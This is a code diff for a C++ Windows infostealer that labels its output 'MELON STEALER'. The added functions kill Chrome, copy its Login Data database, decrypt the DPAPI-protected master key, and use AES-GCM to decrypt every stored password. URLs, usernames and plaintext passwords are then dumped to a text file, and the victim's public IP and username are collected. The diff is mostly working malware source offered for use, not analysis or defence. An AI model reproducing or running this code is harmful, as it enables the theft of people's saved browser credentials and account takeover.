@@ -2,23 +2,23 @@
 #include <iostream>
 #include <Windows.h>
 #include <fstream>
-#include <cstdlib>
 #include <wincrypt.h>
-#include <stdexcept>
-#include <sstream>
 #include <vector>
+#include <filesystem>
 
 //external includes etc.
 #include <curl/curl.h>
 #include "../ext/base64/base64.h"
 #include "../ext/json/json.hpp"
 #include "../ext/logger/logger.h"
-#include "../ext/aes/aes.hpp"
-#include "../ext/sqlite/Database.h"
+#include "../ext/sqlite/sqlite3pp.h"
+#include "../ext/sqlite/sqlite3ppext.h"
+#include <openssl/evp.h>
+#include <openssl/aes.h>
+
 
 //using nlohmanns json for easy reading and parsing
 using json = nlohmann::json;
-
 
 
 // Magic chatGPT callback for curl
@@ -61,9 +61,9 @@ std::string get_ip() {
         //perform action (send request)
         res = curl_easy_perform(curl);
 
-        //print errors if any.
+        //log errors if any.
         if (res != CURLE_OK) {
-            printf("some error occured: %s\n", curl_easy_strerror(res));
+            logger::log(logger::error, "Some error occured: %s", curl_easy_strerror(res));
         }
 
 
@@ -73,17 +73,17 @@ std::string get_ip() {
     else {
         printf("curl no worky. \n");
     }
-    //return public IP for later use.
+    //return public IP for later use. (LOL)
     return return_ip;
 
 }
-
 
 
 //define paths etc.
 namespace definitions {
     std::string ip = get_ip();
     std::string home = std::getenv("USERPROFILE");
+    std::string username = home.substr(home.find_last_of("\\") + 1);
     std::string browser = home + "\\AppData\\Local\\Google\\Chrome\\User Data\\";
     std::string localstate_path(browser + "Local State");
     std::string localstate_content = read_file_utf8(definitions::localstate_path);
@@ -181,7 +181,7 @@ std::vector<BYTE> unprotectData(const std::string& decoded_key_str) {
         throw std::runtime_error(ss.str());
     }
 
-    // Store decrypted data in a vector
+    // Store decrypted data in a vector for later use.
     std::vector<BYTE> unprotectedKey(decryptedBlob.pbData, decryptedBlob.pbData + decryptedBlob.cbData);
 
     // Free memory allocated for decrypted data
@@ -216,40 +216,143 @@ std::vector<BYTE> decode_key(const std::string& encoded_key_str) {
     return {}; //return empty of smth happened
 }
 
+
+// AES decryption function using OpenSSL --chatgpt
+std::vector<unsigned char> decryptAES(const std::vector<unsigned char>& encryptedData, const std::vector<unsigned char>& key, const std::vector<unsigned char>& iv) {
+    if (encryptedData.size() < 16) {
+        logger::log(logger::error, "Encrypted data is too short.");
+
+    }
+    std::vector<unsigned char> tag(encryptedData.end() - 16, encryptedData.end());
+
+    std::vector<unsigned char> actualEncryptedData(encryptedData.begin(), encryptedData.end() - 16);
+
+    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
+    if (!ctx) {
+        logger::log(logger::error, "Failed to create cipher context.");
+    }
+
+    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, key.data(), iv.data()) != 1) {
+        EVP_CIPHER_CTX_free(ctx);
+        logger::log(logger::error, "Failed to initialize decryption.");
+
+    }
+
+    std::vector<unsigned char> decryptedData(actualEncryptedData.size());
+    int decryptedLen = 0;
+
+    if (EVP_DecryptUpdate(ctx, decryptedData.data(), &decryptedLen, actualEncryptedData.data(), actualEncryptedData.size()) != 1) {
+        EVP_CIPHER_CTX_free(ctx);
+        logger::log(logger::error, "Failed to decrypt data.");
+
+    }
+
+    // Set the expected tag value
+    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, tag.size(), tag.data()) != 1) {
+        EVP_CIPHER_CTX_free(ctx);
+        logger::log(logger::error, "Failed to set GCM tag.");
+
+    }
+
+    int finalLen = 0;
+    if (EVP_DecryptFinal_ex(ctx, decryptedData.data() + decryptedLen, &finalLen) != 1) {
+        EVP_CIPHER_CTX_free(ctx);
+        logger::log(logger::error, "Failed to finalize decryption.");
+
+    }
+
+    decryptedData.resize(decryptedLen + finalLen);
+    EVP_CIPHER_CTX_free(ctx);
+
+    return decryptedData;
+}
+
+void steal_db(std::string path) {
+    try
+    {
+        if (std::filesystem::exists(definitions::browser + "Default\\Login Data.db")) {
+            std::filesystem::remove(definitions::browser + "Default\\Login Data.db");
+            logger::log(logger::success, "Cleaned up leftovers.");
+        }
+        system("start taskkill /F /IM chrome.exe");
+        std::filesystem::copy_file(path, path + ".db");
+    }
+    catch (const std::exception& e)
+    {
+        logger::log(logger::error, "Some error occured while stealing DB. %s", e.what());
+    }
+}
+
+void retrieve_DB(const std::string& dbname, const std::string& query, const std::vector<BYTE>& aeskey) {
+    
+    try {
+        sqlite3pp::database db(dbname.c_str());
+        sqlite3pp::query qry(db, query.c_str());
+
+        std::fstream dumpedDB;
+        dumpedDB.open("dumpedDB.txt", std::ios::out | std::ios::trunc);
+        for (auto i = qry.begin(); i != qry.end(); ++i) {
+            std::string origin_url = (*i).get<std::string>(0);
+            std::string username_value = (*i).get<std::string>(1);
+
+            const void* encrypted_password_data = (*i).get<const void*>(2);
+            int encrypted_password_data_size = (*i).column_bytes(2);
+            std::vector<unsigned char> blob_vec(reinterpret_cast<const unsigned char*>(encrypted_password_data),
+                reinterpret_cast<const unsigned char*>(encrypted_password_data) + encrypted_password_data_size);
+
+            // Extract IV (bytes 3-15) and encrypted password (bytes 15 to end minus last 16 bytes)
+            std::vector<unsigned char> iv(blob_vec.begin() + 3, blob_vec.begin() + 15);
+            std::vector<unsigned char> encrypted_password(blob_vec.begin() + 15, blob_vec.end());
+
+            // Decrypt the password
+            std::vector<unsigned char> decrypted_password = decryptAES(encrypted_password, aeskey, iv);
+
+            // Convert decrypted data to string
+            std::string password_str(decrypted_password.begin(), decrypted_password.end());
+
+            if (!dumpedDB.is_open()) {
+                logger::log(logger::error, "File cant be opened");
+            }
+            dumpedDB << "URL: " << origin_url << "\n" << "Username: " << username_value << "\n" << "Password: " << password_str << "\n" << "\n ---MELON STEALER--- \n";
+            
+            logger::log(logger::success, "Successfully Decrypted and retrieved DB.");
+        }
+        dumpedDB.close();
+    }
+    catch (const std::exception& e) {
+        logger::log(logger::error, "An error occurred while querying the database:, %s", e.what());
+    }
+}
+
+void cleanup() {
+
+}
+
 void log_info() {
     logger::log(logger::info, "IP: %s ", definitions::ip.c_str());
+    logger::log(logger::info, "Username: %s", definitions::username.c_str());
     logger::log(logger::info, "home directory: %s ", definitions::home.c_str());
     logger::log(logger::info, "browser directory: %s ", definitions::browser.c_str());
     logger::log(logger::info, "local state file: %s ", definitions::localstate_path.c_str());
 }
-// Function to print bytes as hexadecimal
-void print_hex(const std::vector<BYTE>& data) {
-    for (size_t i = 0; i < data.size(); i++) {
-        std::cout << std::setw(2) << std::setfill('0') << std::hex << (int)data[i];
-    }
-    std::cout << std::endl;
-}
 
 int main() {
-
+    steal_db(definitions::browser + "Default\\Login Data");
     get_ip();
     json localstate_json = read_local_state();
     check_json(localstate_json);
 
     try {
-        //decode base64 key and remove dpapi prefix. then decrypt it
         //use AES key to later decrypt further.
         std::vector<BYTE> aeskey = decode_key(definitions::encoded_key_str);
-        print_hex(aeskey);
+        retrieve_DB(definitions::browser + "Default\\Login Data.db", "SELECT origin_url, username_value, password_value from LOGINS", aeskey);
     }
     catch (const std::exception& e) {
         logger::log(logger::error, "Error occurred while decoding/unprotecting key: %s", e.what());
     }
 
-
-
+    cleanup();
     log_info();
     std::cin.get();
 	return 0;
 }
-
